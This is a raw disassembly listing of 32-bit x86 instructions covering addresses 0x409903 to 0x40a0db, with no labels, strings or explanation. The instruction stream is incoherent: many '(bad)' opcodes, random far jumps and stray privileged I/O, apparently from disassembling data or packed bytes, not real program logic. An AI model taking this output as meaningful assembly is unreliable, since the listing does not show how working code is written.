  409903:	or     DWORD PTR [esi+eiz*8+0x58],esi
  409907:	cwde   
  409908:	ins    BYTE PTR es:[edi],dx
  409909:	icebp  
  40990a:	mov    al,0xcf
  40990c:	dec    ebp
  40990d:	imul   eax,DWORD PTR [ebx+0x7cfd762b],0x25
  409914:	(bad)  
  409915:	push   esp
  409916:	xor    al,0x70
  409918:	leave  
  409919:	and    cl,bl
  40991b:	lea    edi,[edx+0xcb327a3]
  409921:	xor    al,BYTE PTR [esi+ebx*2-0x1a]
  409925:	sbb    BYTE PTR [edx+0x7f98e79c],0xc2
  40992c:	scas   eax,DWORD PTR es:[edi]
  40992d:	sbb    eax,0xd9f5338e
  409932:	jae    0x409991
  409934:	xchg   esi,eax
  409935:	push   edx
  409936:	jge    0x409972
  409938:	cld    
  409939:	mov    WORD PTR [ebp-0x5c],cs
  40993c:	jns    0x40998e
  40993e:	popa   
  40993f:	fild   DWORD PTR [ebx+0x2606a137]
  409945:	mov    gs,edi
  409947:	or     eax,0xb259771a
  40994c:	repz call 0xd3d726cd
  409952:	push   ebx
  409953:	(bad)  
  409955:	and    esi,DWORD PTR [edx+edi*1-0x4f]
  409959:	les    ecx,FWORD PTR [eax+0x3]
  40995c:	mov    ds:0x177f840c,al
  409961:	cmc    
  409962:	call   FWORD PTR [edi-0x7a]
  409965:	cmp    DWORD PTR ds:0x434b4153,ecx
  40996b:	dec    edi
  40996c:	inc    edx
  40996d:	jno    0x409952
  40996f:	inc    ebp
  409970:	(bad)  
  409972:	mov    al,0xd5
  409974:	(bad)  
  409976:	(bad)  
  409977:	clc    
  409978:	or     dh,BYTE PTR [edi+0x376b7253]
  40997e:	call   0x4a505022
  409983:	and    bl,BYTE PTR [ecx-0x1f257c8c]
  409989:	and    BYTE PTR [ebx+0x7c195285],cl
  40998f:	push   ecx
  409990:	dec    ecx
  409991:	jge    0x409938
  409993:	sbb    eax,0x7a9a1974
  409998:	mov    ds:0x9007a56e,eax
  40999d:	retf   
  40999e:	adc    BYTE PTR [ecx+0x54565523],cl
  4099a4:	push   es
  4099a5:	mov    esp,0x820ca488
  4099aa:	shl    dh,0xd3
  4099ad:	jae    0x409960
  4099af:	sti    
  4099b0:	je     0x409961
  4099b2:	fwait
  4099b3:	or     ebx,ebp
  4099b5:	mov    esp,edx
  4099b7:	inc    edx
  4099b8:	jmp    0x4295:0xac67a404
  4099bf:	ja     0x409a29
  4099c1:	in     eax,dx
  4099c2:	add    DWORD PTR [esi+0x1f9c2f6d],edi
  4099c8:	fs mov bh,0xd0
  4099cb:	(bad)  
  4099cc:	jmp    0xf164:0x86242ac3
  4099d3:	mov    edi,0x54a2a8ec
  4099d8:	outs   dx,DWORD PTR ds:[esi]
  4099d9:	push   0x5d
  4099db:	fcomip st,st(2)
  4099dd:	or     cl,BYTE PTR [ebp-0xb09648c]
  4099e3:	fmul   DWORD PTR [edi-0x6f]
  4099e6:	add    eax,0xa35a7ac9
  4099eb:	xchg   DWORD PTR [edi+0x5eec4061],esi
  4099f1:	sub    BYTE PTR ds:[eax+esi*8-0x59f086a9],al
  4099f9:	cld    
  4099fa:	dec    ebp
  4099fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099fc:	test   BYTE PTR ds:0x468211ee,ch
  409a02:	lods   eax,DWORD PTR ds:[esi]
  409a03:	out    dx,al
  409a04:	jge    0x409a03
  409a06:	xor    ah,BYTE PTR [ebx-0x1ef279b7]
  409a0c:	xlat   BYTE PTR ds:[ebx]
  409a0d:	xchg   ecx,eax
  409a0e:	mov    cl,BYTE PTR [ecx+eiz*8]
  409a11:	jle    0x409a4f
  409a13:	fcomp  DWORD PTR [ebx]
  409a15:	adc    ebp,DWORD PTR ds:[ebp+edx*1-0x2]
  409a1a:	fisub  WORD PTR [ecx]
  409a1c:	fisubr WORD PTR [ecx+0x32]
  409a1f:	retf   0xd361
  409a22:	jmp    0x4099da
  409a24:	retf   0xc03b
  409a27:	xor    DWORD PTR [eax-0x243d69d8],esi
  409a2d:	dec    esi
  409a2e:	ja     0x409a64
  409a30:	jns    0x409a34
  409a32:	das    
  409a33:	inc    esi
  409a34:	mov    esi,0xf36368b3
  409a39:	addr16 cmp al,0x7e
  409a3c:	in     al,dx
  409a3d:	xlat   BYTE PTR es:[ebx]
  409a3f:	outs   dx,DWORD PTR ds:[esi]
  409a40:	adc    BYTE PTR [edi+ecx*8+0x20e8d22f],ch
  409a47:	popf   
  409a48:	xchg   ecx,eax
  409a49:	or     esp,edi
  409a4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a4c:	push   es
  409a4d:	loope  0x409a89
  409a4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a50:	jmp    0x409a55
  409a52:	arpl   WORD PTR [edx+0x772c9d38],cx
  409a58:	test   al,0xdf
  409a5a:	xchg   esi,eax
  409a5b:	and    ecx,DWORD PTR [ebx-0x68]
  409a5e:	push   cs
  409a5f:	dec    edx
  409a60:	xchg   esi,eax
  409a61:	sub    al,BYTE PTR [ecx]
  409a63:	rol    BYTE PTR [eax],1
  409a65:	push   ds
  409a66:	cmp    esi,ecx
  409a68:	adc    al,dh
  409a6a:	push   ecx
  409a6b:	mov    al,ds:0x1e723467
  409a70:	mov    ah,0xad
  409a72:	lds    esp,FWORD PTR [eax-0xe]
  409a75:	inc    ecx
  409a76:	inc    eax
  409a77:	sti    
  409a78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a79:	pop    ds
  409a7a:	add    DWORD PTR [esi+0x2a6474c8],ebx
  409a80:	shr    DWORD PTR [esi+ebp*4],0x5a
  409a84:	shr    DWORD PTR [edx-0x7e943028],0x54
  409a8b:	mov    edi,0x52bad250
  409a90:	and    DWORD PTR [ebx],ecx
  409a92:	push   edi
  409a93:	cmp    eax,DWORD PTR [ecx]
  409a95:	dec    esi
  409a96:	jge    0x409ae6
  409a98:	mov    esi,0x98737bce
  409a9d:	test   DWORD PTR [ebx+0x35f3ca7d],esi
  409aa3:	rcl    BYTE PTR [ebx],0xa8
  409aa6:	test   eax,0x2b2421fe
  409aab:	add    DWORD PTR [eax],0xc9f4c8d8
  409ab1:	push   cs
  409ab2:	lock mov dh,0xea
  409ab5:	aam    0x52
  409ab7:	push   es
  409ab8:	fnsetpm(287 only) 
  409aba:	push   ebx
  409abb:	pop    edi
  409abc:	call   0x52e4b8f8
  409ac1:	arpl   di,bx
  409ac3:	dec    ecx
  409ac4:	lahf   
  409ac5:	jmp    0xfe191c14
  409aca:	int    0xc6
  409acc:	mov    dl,ch
  409ace:	dec    edi
  409acf:	popf   
  409ad0:	outs   dx,BYTE PTR ds:[esi]
  409ad1:	je     0x409aa6
  409ad3:	in     eax,dx
  409ad4:	sbb    bl,BYTE PTR [edx]
  409ad6:	nop
  409ad7:	(bad)  
  409ad8:	outs   dx,BYTE PTR ds:[esi]
  409ad9:	jnp    0x409ae2
  409adb:	jmp    0x409aec
  409add:	pop    ebp
  409ade:	xchg   ebx,eax
  409adf:	fs call ebx
  409ae2:	push   ds
  409ae3:	or     al,0x2a
  409ae5:	faddp  st(6),st
  409ae7:	or     eax,0x81484a31
  409aec:	cld    
  409aed:	inc    edx
  409aee:	push   esi
  409aef:	add    BYTE PTR [ebx+0x6807d05b],al
  409af5:	xor    DWORD PTR [ebx-0x39],esi
  409af8:	jb     0x409b00
  409afa:	out    dx,al
  409afb:	lods   al,BYTE PTR ds:[esi]
  409afc:	cld    
  409afd:	cli    
  409afe:	jge    0x409afc
  409b00:	xor    eax,0xc2a94ca3
  409b05:	shl    DWORD PTR [ebx],cl
  409b07:	popf   
  409b08:	popa   
  409b09:	sub    BYTE PTR [esi-0x56],dl
  409b0c:	(bad)  
  409b0d:	push   esp
  409b0e:	jp     0x409b6d
  409b10:	js     0x409b83
  409b12:	dec    eax
  409b13:	add    al,0x13
  409b15:	add    DWORD PTR [ebx+0xb],ebp
  409b18:	pop    ds
  409b19:	xchg   esp,eax
  409b1a:	imul   BYTE PTR [edx-0x2faa2fea]
  409b20:	cmc    
  409b21:	jl     0x409b54
  409b23:	xor    al,0xe8
  409b25:	into   
  409b26:	fadd   DWORD PTR [esi+edi*2]
  409b29:	outs   dx,BYTE PTR ds:[esi]
  409b2a:	out    dx,al
  409b2b:	push   esp
  409b2c:	bound  edx,QWORD PTR cs:[ecx+esi*4-0x61626607]
  409b34:	sbb    eax,0xbd0175d3
  409b39:	out    0xbb,eax
  409b3b:	outs   dx,DWORD PTR ds:[esi]
  409b3c:	jg     0x409b65
  409b3e:	push   edi
  409b3f:	mov    ah,0x7c
  409b41:	mov    dh,0x5d
  409b43:	leave  
  409b44:	cmp    ah,BYTE PTR [esi]
  409b46:	jne    0x409b94
  409b48:	add    dl,BYTE PTR [esi+0x7c]
  409b4b:	jp     0x409add
  409b4d:	out    0x83,eax
  409b4f:	stos   BYTE PTR es:[edi],al
  409b50:	popf   
  409b51:	cmp    DWORD PTR [ecx],ebp
  409b53:	je     0x409b2b
  409b55:	xor    ch,BYTE PTR [edi-0x6b]
  409b58:	call   0x5f15ef06
  409b5d:	dec    eax
  409b5e:	std    
  409b5f:	(bad)  [ecx+0x36642f46]
  409b65:	or     al,0xa1
  409b67:	jp     0x409be1
  409b69:	mov    edi,0x9d5b2e7f
  409b6e:	sub    al,0x28
  409b70:	jne    0x409b6e
  409b72:	loopne 0x409b1c
  409b74:	add    al,0x6c
  409b76:	sub    al,0x2f
  409b78:	and    edi,edx
  409b7a:	push   esi
  409b7b:	inc    ebx
  409b7c:	stc    
  409b7d:	xchg   edi,eax
  409b7e:	bound  esi,QWORD PTR [eax+0x113036db]
  409b84:	lock push ecx
  409b86:	jmp    0x409b7e
  409b88:	jmp    0x409be3
  409b8a:	and    BYTE PTR ds:0x5f196448,bl
  409b90:	in     eax,0x46
  409b92:	mov    esi,0xe986cb6b
  409b97:	dec    edx
  409b98:	xchg   esp,eax
  409b99:	adc    eax,0xb6fe1dfd
  409b9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ba0:	or     dh,ch
  409ba2:	push   0x7b918ada
  409ba7:	mov    dh,0x3e
  409ba9:	nop
  409baa:	inc    esp
  409bab:	xor    eax,0x918d753c
  409bb0:	aas    
  409bb1:	or     BYTE PTR [eax+0x6c],dl
  409bb4:	or     ah,al
  409bb6:	lahf   
  409bb7:	or     ah,BYTE PTR [ecx+0x786d00f9]
  409bbd:	ins    DWORD PTR es:[edi],dx
  409bbe:	mov    dl,0xef
  409bc0:	stos   WORD PTR es:[edi],ax
  409bc2:	jb     0x409bad
  409bc4:	add    dl,ah
  409bc6:	rcr    BYTE PTR [edi+0xb],1
  409bc9:	in     al,0x31
  409bcb:	into   
  409bcc:	xchg   ecx,eax
  409bcd:	jecxz  0x409bb4
  409bcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bd0:	(bad)  
  409bd1:	adc    eax,0xf335e119
  409bd6:	call   0x3024:0x3dba86be
  409bdd:	cli    
  409bde:	xchg   esp,eax
  409bdf:	jo     0x409b74
  409be1:	mov    ch,0x36
  409be3:	add    esi,DWORD PTR [edx]
  409be5:	mov    dh,0x30
  409be7:	push   cs
  409be8:	inc    edx
  409be9:	out    0xa9,eax
  409beb:	push   es
  409bec:	or     eax,0xc83fc14e
  409bf1:	xchg   esp,eax
  409bf2:	pop    ds
  409bf3:	xchg   eax,eax
  409bf5:	or     al,0x1c
  409bf7:	ds (bad) 
  409bf9:	call   0x67b96ce2
  409bfe:	sahf   
  409bff:	gs or  dh,BYTE PTR ds:[ecx+0x733ee5a1]
  409c07:	dec    ebp
  409c08:	inc    ebp
  409c09:	xor    al,0x1a
  409c0b:	sti    
  409c0c:	mov    edx,0xa13181f8
  409c11:	rcr    BYTE PTR [ecx*2+0x4dacec16],cl
  409c18:	mov    dl,0x8b
  409c1a:	jnp    0x409c1f
  409c1c:	push   edx
  409c1d:	adc    eax,0xe8bc0403
  409c22:	aam    0x29
  409c24:	mov    esp,0x8d4e1615
  409c29:	push   esp
  409c2a:	scas   al,BYTE PTR es:[edi]
  409c2b:	adc    BYTE PTR ds:0xdac91f18,0x84
  409c32:	out    0x65,eax
  409c34:	pop    es
  409c35:	pop    ebp
  409c36:	xchg   edx,eax
  409c37:	push   ss
  409c38:	mov    esi,0x5a019375
  409c3d:	sbb    al,BYTE PTR [eax-0x7ce25857]
  409c43:	cmp    BYTE PTR fs:[edx-0x6471aae7],bh
  409c4a:	xchg   edi,eax
  409c4b:	xchg   BYTE PTR [edx],bh
  409c4d:	loopne 0x409ccd
  409c4f:	mov    ah,0xf7
  409c51:	add    eax,0xb44b6788
  409c56:	or     DWORD PTR [esi+0x56d2e17c],0xa
  409c5d:	addr16 cmc 
  409c5f:	and    DWORD PTR [esi+0x27319ab0],edx
  409c65:	add    DWORD PTR [ecx],ecx
  409c67:	inc    ebp
  409c68:	in     al,0xdf
  409c6a:	stos   DWORD PTR es:[edi],eax
  409c6b:	mov    al,0x36
  409c6e:	dec    edi
  409c6f:	sbb    ecx,DWORD PTR [esi+0x64a15620]
  409c75:	dec    esp
  409c76:	sub    BYTE PTR cs:[ecx+0x1820fd20],0x88
  409c7e:	dec    eax
  409c7f:	in     eax,dx
  409c80:	sbb    eax,0xd2217234
  409c85:	adc    eax,0xaf96591
  409c8a:	dec    eax
  409c8b:	sbb    eax,0x82c87915
  409c90:	idiv   DWORD PTR [esi]
  409c92:	jmp    0x409c55
  409c94:	mov    dh,0xd5
  409c96:	out    dx,al
  409c97:	pop    ecx
  409c98:	inc    edi
  409c99:	xchg   edi,eax
  409c9a:	pop    edx
  409c9b:	(bad)  
  409c9c:	stos   BYTE PTR es:[edi],al
  409c9d:	mov    esi,0xc655ec43
  409ca2:	xchg   esi,eax
  409ca3:	mov    al,ds:0xf0e47182
  409ca8:	(bad)  
  409ca9:	or     BYTE PTR [ecx+0x67e80fed],dh
  409caf:	cmp    BYTE PTR [eax],dh
  409cb1:	popf   
  409cb2:	dec    ebx
  409cb3:	dec    eax
  409cb4:	xor    eax,DWORD PTR [ebp-0x9]
  409cb7:	ins    DWORD PTR es:[edi],dx
  409cb8:	retf   
  409cb9:	cmp    al,0x2f
  409cbb:	jnp    0x409cb8
  409cbd:	arpl   WORD PTR [ecx+0x74],bp
  409cc0:	lds    edi,FWORD PTR [ebx+ecx*4-0x2c56c920]
  409cc7:	sub    al,0x66
  409cc9:	pop    edi
  409cca:	and    eax,0x222e6ce4
  409ccf:	mov    ecx,DWORD PTR [ecx+esi*2]
  409cd2:	push   esp
  409cd3:	call   0xe333:0x1fa54ebc
  409cda:	lahf   
  409cdb:	loop   0x409d4c
  409cdd:	(bad)  
  409cdf:	pop    esi
  409ce0:	xor    esp,DWORD PTR [edi+ebx*8-0x6b1da467]
  409ce7:	jbe    0x409d14
  409ce9:	out    0x76,al
  409ceb:	dec    DWORD PTR [edx]
  409ced:	pusha  
  409cee:	stos   BYTE PTR es:[edi],al
  409cef:	fprem  
  409cf1:	sbb    al,0x94
  409cf3:	add    eax,0xb1b1292b
  409cf8:	cdq    
  409cf9:	jne    0x409d1c
  409cfb:	icebp  
  409cfc:	(bad)  
  409cfe:	(bad)  
  409d01:	add    dh,BYTE PTR [edi+0x4bbb5648]
  409d07:	sbb    ebx,0xffffffb4
  409d0a:	aas    
  409d0b:	add    al,0xdd
  409d0d:	xchg   ebx,eax
  409d0e:	xchg   dl,al
  409d10:	inc    ebx
  409d11:	push   esi
  409d12:	dec    esp
  409d13:	xor    edx,ebp
  409d15:	call   0xd7d2c1cb
  409d1a:	xchg   ebp,eax
  409d1b:	addr16 stc 
  409d1d:	and    DWORD PTR [edx],0xa453f2ed
  409d23:	sbb    al,BYTE PTR [ecx+0x399a7578]
  409d29:	push   edi
  409d2a:	xchg   edx,eax
  409d2b:	icebp  
  409d2c:	or     DWORD PTR [esi-0x413c220e],0x15aa5e73
  409d36:	mov    bh,0xf3
  409d38:	aas    
  409d39:	test   al,0x43
  409d3b:	mov    bl,0xa2
  409d3d:	or     DWORD PTR [ebx+0x179137cc],esp
  409d43:	and    bl,BYTE PTR [esi]
  409d45:	add    BYTE PTR [esi+ebx*8],0xfd
  409d49:	ret    
  409d4a:	cmp    dh,BYTE PTR [eax-0x3c]
  409d4d:	fcom   QWORD PTR [ebx-0x2b]
  409d50:	mov    al,ds:0xb10ac367
  409d55:	lock jns 0x409dd1
  409d58:	sub    BYTE PTR [ecx+edi*8+0x1b62f778],bh
  409d5f:	call   0x2b34edcd
  409d64:	cmp    eax,0xb641131b
  409d69:	int    0xcb
  409d6b:	test   eax,0x823cd633
  409d70:	lea    ecx,[edi]
  409d72:	aas    
  409d73:	sub    cl,BYTE PTR ds:0x6ffe1510
  409d79:	repz sbb edx,DWORD PTR [ebp+0x48]
  409d7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d7e:	push   eax
  409d7f:	and    eax,0x86f5cf54
  409d84:	(bad)  
  409d85:	mov    ebx,0x4136a8a9
  409d8a:	xchg   edx,eax
  409d8b:	mov    dl,0xbe
  409d8d:	jp     0x409d27
  409d8f:	adc    esi,0x3e
  409d92:	retf   
  409d93:	test   al,0xa1
  409d95:	jae    0x409df5
  409d97:	enter  0x5731,0x8c
  409d9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d9c:	inc    esp
  409d9d:	cli    
  409d9e:	out    0xa3,eax
  409da0:	sbb    DWORD PTR [ebp-0x4b9a597e],ebp
  409da6:	dec    ebp
  409da7:	add    al,0x75
  409da9:	int3   
  409daa:	les    esi,FWORD PTR [ecx]
  409dac:	pop    ebp
  409dad:	aas    
  409dae:	jns    0x409dc7
  409db0:	xor    esp,ecx
  409db2:	sbb    DWORD PTR ds:0xe293122d,0x48810f56
  409dbc:	or     eax,0xe39e916f
  409dc1:	shr    BYTE PTR [ebp-0x429d2a8f],1
  409dc7:	xor    al,0x23
  409dc9:	test   al,0x87
  409dcb:	scas   eax,DWORD PTR es:[edi]
  409dcc:	jae    0x409d74
  409dce:	mov    esp,0xd9949b06
  409dd3:	pop    esp
  409dd4:	iret   
  409dd5:	stc    
  409dd6:	mov    cl,0x9
  409dd8:	sub    eax,DWORD PTR ds:0x77751851
  409dde:	sub    BYTE PTR [ecx-0x80af3b2],dh
  409de4:	dec    ebx
  409de5:	(bad)  
  409de7:	push   ebx
  409de8:	mov    esp,eax
  409dea:	sbb    DWORD PTR [ebx+0x68d67582],ecx
  409df0:	dec    ebp
  409df1:	mov    ds:0x44f86629,eax
  409df6:	loope  0x409e1d
  409df8:	fdiv   st(3),st
  409dfa:	scas   al,BYTE PTR es:[edi]
  409dfb:	ret    0x250d
  409dfe:	out    dx,eax
  409dff:	sub    eax,0x600c6a34
  409e04:	jbe    0x409e64
  409e06:	sub    al,0xff
  409e08:	sub    al,BYTE PTR [ebp+eiz*8-0x50d0faf6]
  409e0f:	mov    ch,0xbc
  409e11:	sbb    esp,DWORD PTR [edi]
  409e13:	jno    0x409dc3
  409e15:	pop    edi
  409e16:	jge    0x409e72
  409e18:	fmul   DWORD PTR [ebx-0x59]
  409e1b:	mov    ch,0x45
  409e1d:	sub    DWORD PTR [esp+eiz*2-0x7d],0xffffffd6
  409e22:	pop    eax
  409e23:	and    eax,0x626c0295
  409e28:	dec    ecx
  409e29:	mov    al,BYTE PTR [edx]
  409e2b:	pop    ebx
  409e2c:	ret    
  409e2d:	stos   BYTE PTR es:[edi],al
  409e2e:	nop
  409e2f:	adc    bh,BYTE PTR [ebp-0x25518f7e]
  409e35:	and    ch,BYTE PTR [ecx-0x61]
  409e38:	ja     0x409e8c
  409e3a:	xor    ch,BYTE PTR [eax]
  409e3c:	frstor [ebx-0x53]
  409e3f:	jmp    0x409e02
  409e41:	lods   eax,DWORD PTR ds:[esi]
  409e42:	imul   ecx,DWORD PTR [ebx],0x4b
  409e45:	fwait
  409e46:	lds    ecx,FWORD PTR [esi-0x290d57ad]
  409e4c:	xchg   ebp,eax
  409e4d:	pop    ebx
  409e4e:	add    BYTE PTR [edx],bl
  409e50:	sub    dh,ah
  409e52:	mov    ebx,0xdadee68
  409e57:	dec    esi
  409e58:	pop    ebx
  409e59:	outs   dx,DWORD PTR ds:[esi]
  409e5a:	addr16 loopne 0x409ec2
  409e5d:	xchg   BYTE PTR [ebp-0x452cb6de],cl
  409e63:	xor    bl,BYTE PTR [ecx+0x467fe852]
  409e69:	jp     0x409e05
  409e6b:	jg     0x409ea7
  409e6d:	push   esp
  409e6e:	pop    edx
  409e6f:	outs   dx,DWORD PTR ds:[esi]
  409e70:	push   ebx
  409e71:	aad    0xe9
  409e73:	and    eax,0xa2286692
  409e78:	or     eax,0xd81e93c4
  409e7d:	jno    0x409e33
  409e7f:	out    dx,eax
  409e80:	repnz retf 
  409e82:	outs   dx,BYTE PTR ds:[esi]
  409e83:	mov    BYTE PTR [edi+0x7],bl
  409e86:	jmp    0x206c8949
  409e8b:	push   cs
  409e8c:	pop    es
  409e8d:	push   ecx
  409e8e:	cwde   
  409e8f:	inc    edi
  409e90:	mov    al,ds:0xc768aeb8
  409e95:	cmp    al,0xe1
  409e97:	sar    BYTE PTR [ecx-0x46411a6f],0xf0
  409e9e:	fisub  DWORD PTR [edx+0x76]
  409ea1:	rcl    DWORD PTR [ecx+0x2],1
  409ea4:	call   0x300d1cf7
  409ea9:	inc    ecx
  409eaa:	punpckhbw mm5,QWORD PTR [ebp-0x5bc892d9]
  409eb1:	pop    eax
  409eb2:	in     eax,dx
  409eb3:	jb     0x409f12
  409eb5:	retf   
  409eb6:	mov    ebp,0x94bbcd9
  409ebb:	sar    DWORD PTR [ebx+0x14493bcf],cl
  409ec1:	xchg   esi,eax
  409ec2:	push   ebp
  409ec3:	mov    al,0x0
  409ec5:	adc    edi,DWORD PTR [eax-0x5254259c]
  409ecb:	xchg   esp,eax
  409ecc:	ffreep st(6)
  409ece:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ecf:	push   ss
  409ed0:	test   al,0x1e
  409ed2:	inc    di
  409ed4:	(bad)  
  409ed5:	pop    ss
  409ed6:	int    0x70
  409ed8:	pushf  
  409ed9:	add    BYTE PTR [ebx],ah
  409edb:	mov    bl,0xf9
  409edd:	mov    ebx,DWORD PTR [ecx+0x24aad1da]
  409ee3:	mov    esp,0x6b5f8e92
  409ee8:	pop    es
  409ee9:	pop    eax
  409eea:	xchg   esi,eax
  409eeb:	push   esi
  409eec:	(bad)  
  409eed:	mov    cl,0xce
  409eef:	xchg   ebp,edi
  409ef1:	pusha  
  409ef2:	dec    esp
  409ef3:	into   
  409ef4:	(bad)  
  409ef6:	scas   eax,DWORD PTR es:[edi]
  409ef7:	inc    ecx
  409ef8:	or     eax,0x5e3c2a6b
  409efd:	sbb    DWORD PTR [eax-0x3b],ecx
  409f00:	jno    0x409efe
  409f02:	jmp    0x4f6a:0x432b0e85
  409f09:	mov    bh,0xd2
  409f0b:	push   edx
  409f0c:	lods   eax,DWORD PTR ds:[esi]
  409f0d:	mov    ebp,0xcf8ddf9f
  409f12:	jmp    0x25b:0x7a3e8c12
  409f19:	std    
  409f1a:	popa   
  409f1b:	jns    0x409edd
  409f1d:	xchg   ecx,eax
  409f1e:	fmul   QWORD PTR [eax+0x12fb6a13]
  409f24:	pushf  
  409f25:	jb     0x409f75
  409f27:	xchg   ebx,eax
  409f28:	not    BYTE PTR [edi]
  409f2a:	adc    ebp,DWORD PTR ds:0x18f5dc0a
  409f30:	dec    eax
  409f31:	lods   al,BYTE PTR ds:[esi]
  409f32:	cmc    
  409f33:	pop    ss
  409f34:	mov    edi,0xa5d829dc
  409f39:	iret   
  409f3a:	stos   DWORD PTR es:[edi],eax
  409f3b:	xchg   esi,eax
  409f3c:	xor    eax,eax
  409f3e:	inc    ebx
  409f3f:	dec    eax
  409f40:	into   
  409f41:	dec    ecx
  409f42:	mov    eax,ds:0xc212e534
  409f47:	cdq    
  409f48:	ror    DWORD PTR [ebx-0x4f5c8510],0xe0
  409f4f:	xor    esi,esp
  409f51:	and    bl,BYTE PTR [ecx+0x63a63596]
  409f57:	add    BYTE PTR [ecx+0x30],al
  409f5a:	rol    DWORD PTR [edi-0x14c8d854],0xdd
  409f61:	sti    
  409f62:	sub    al,0x7a
  409f64:	jecxz  0x409fb6
  409f66:	jns    0x409f4e
  409f68:	xchg   esi,eax
  409f69:	out    0xe0,al
  409f6b:	xchg   edx,eax
  409f6c:	jo     0x409f75
  409f6e:	repnz or BYTE PTR [ebp+0x23],ch
  409f72:	loope  0x409fd4
  409f74:	or     al,0x1d
  409f76:	iret   
  409f77:	mov    ds:0x48f8b5e7,eax
  409f7c:	add    BYTE PTR [edi+eax*1-0x4553dcc9],ah
  409f83:	addr16 pop ecx
  409f85:	les    ecx,FWORD PTR [ebp+0x4d016a66]
  409f8b:	lods   al,BYTE PTR ds:[esi]
  409f8c:	out    0x3d,eax
  409f8e:	mov    al,0x2a
  409f90:	push   eax
  409f91:	enter  0x6136,0x6d
  409f95:	das    
  409f96:	pop    edi
  409f97:	add    DWORD PTR [edx+eiz*8],ebx
  409f9a:	sub    DWORD PTR [ecx-0x5],eax
  409f9d:	cmp    eax,0x4d9858cb
  409fa2:	rol    BYTE PTR [edx+0x4a08daea],0x19
  409fa9:	icebp  
  409faa:	or     dl,BYTE PTR [ecx]
  409fac:	push   esp
  409fad:	sbb    ch,BYTE PTR [edi]
  409faf:	repz clc 
  409fb1:	out    0x78,eax
  409fb3:	xor    al,0x58
  409fb5:	and    DWORD PTR [edx+0x5e9db6eb],0xffffffc1
  409fbc:	mov    ebx,fs
  409fbe:	das    
  409fbf:	mov    eax,ds:0x141dbae
  409fc4:	(bad)  
  409fc5:	cld    
  409fc6:	pop    ds
  409fc7:	ds jae 0x409f61
  409fca:	jb     0x409fe1
  409fcc:	lds    edi,FWORD PTR [ebp+0x2a]
  409fcf:	push   esi
  409fd0:	mov    edi,0x65443a65
  409fd5:	mov    ds:0xb757b535,eax
  409fda:	xor    al,0xe0
  409fdc:	mov    dh,0x67
  409fde:	mov    ds:0x8a294836,al
  409fe3:	out    dx,al
  409fe4:	shl    BYTE PTR [ebx-0x58],1
  409fe7:	mov    edx,0x8276f57
  409fec:	dec    ebp
  409fed:	push   ebx
  409fee:	mov    cl,BYTE PTR [edx]
  409ff0:	push   0x74ce233b
  409ff5:	ds mov ebp,0x201f8640
  409ffb:	stc    
  409ffc:	je     0x409f99
  409ffe:	stos   BYTE PTR es:[edi],al
  409fff:	ds jge 0x40a059
  40a002:	sub    eax,0x77eb5fcc
  40a007:	std    
  40a008:	std    
  40a009:	pop    edi
  40a00a:	push   cs
  40a00b:	js     0x40a03b
  40a00d:	(bad)  
  40a00e:	xor    al,bh
  40a010:	sbb    BYTE PTR [edx+0x2a55f47f],ah
  40a016:	mul    BYTE PTR ds:[esi-0x2]
  40a01a:	daa    
  40a01b:	xor    eax,0x1b9a17
  40a020:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a021:	xor    al,0xe7
  40a023:	fcmovu st,st(1)
  40a025:	xlat   BYTE PTR ds:[ebx]
  40a026:	mov    bl,0xd1
  40a028:	loop   0x409fc1
  40a02a:	inc    ebx
  40a02b:	mov    ecx,0x174ebfa1
  40a030:	xchg   edx,esi
  40a032:	jl     0x409ff1
  40a034:	cmp    BYTE PTR [esi],ch
  40a036:	sti    
  40a037:	push   esp
  40a038:	inc    edx
  40a039:	pop    es
  40a03a:	mov    esi,0xd9a65975
  40a03f:	push   es
  40a040:	pop    ss
  40a041:	xchg   esp,eax
  40a042:	pop    ss
  40a043:	retf   
  40a044:	sub    BYTE PTR [esi+0x40],al
  40a047:	mov    esp,0xc8837fcd
  40a04c:	push   edx
  40a04d:	xor    DWORD PTR ds:0x84e03aae,edx
  40a053:	fidivr WORD PTR [edx+0x79e02ebf]
  40a059:	int    0x86
  40a05b:	pop    esp
  40a05c:	retf   
  40a05d:	xor    edx,ecx
  40a05f:	(bad)  
  40a060:	inc    ecx
  40a061:	mov    ds:0x9d0ce08a,eax
  40a066:	jns    0x409ff7
  40a068:	mov    edx,0x19fa0fac
  40a06d:	jecxz  0x40a0e3
  40a06f:	shl    DWORD PTR [eax+0x48d47c8f],1
  40a075:	mov    dl,0xa6
  40a077:	je     0x40a091
  40a079:	and    esi,DWORD PTR [edx-0xf4395e5]
  40a07f:	mov    ecx,0x1de407c8
  40a084:	sahf   
  40a085:	add    BYTE PTR [esi+0x55772f65],bh
  40a08b:	int3   
  40a08c:	fimul  DWORD PTR [ebx]
  40a08e:	or     esp,esi
  40a090:	(bad)  
  40a091:	lods   al,BYTE PTR ds:[esi]
  40a092:	add    eax,0x175b96bb
  40a097:	and    BYTE PTR [esi-0x764fcaad],cl
  40a09d:	movq   QWORD PTR ds:0xa624c100,mm2
  40a0a4:	mov    ah,0x40
  40a0a6:	xchg   esp,eax
  40a0a7:	pop    ebx
  40a0a8:	jle    0x40a059
  40a0aa:	cld    
  40a0ab:	mov    edx,0x1730a5e3
  40a0b0:	shl    DWORD PTR [edx+0x1a],0xa8
  40a0b4:	inc    edi
  40a0b5:	sbb    DWORD PTR [edx+0x8dd4fc3],ebp
  40a0bb:	or     ebx,esp
  40a0bd:	gs jge 0x40a0d8
  40a0c0:	les    esp,FWORD PTR [edi-0x164ed9ee]
  40a0c6:	clc    
  40a0c7:	fstp   QWORD PTR [ebx-0x73]
  40a0ca:	add    eax,0x1fc93091
  40a0cf:	adc    eax,0x98b5fb0d
  40a0d4:	ror    DWORD PTR [eax-0x1ee04486],1
  40a0da:	pop    esp
  40a0db:	ret    0xe6ca
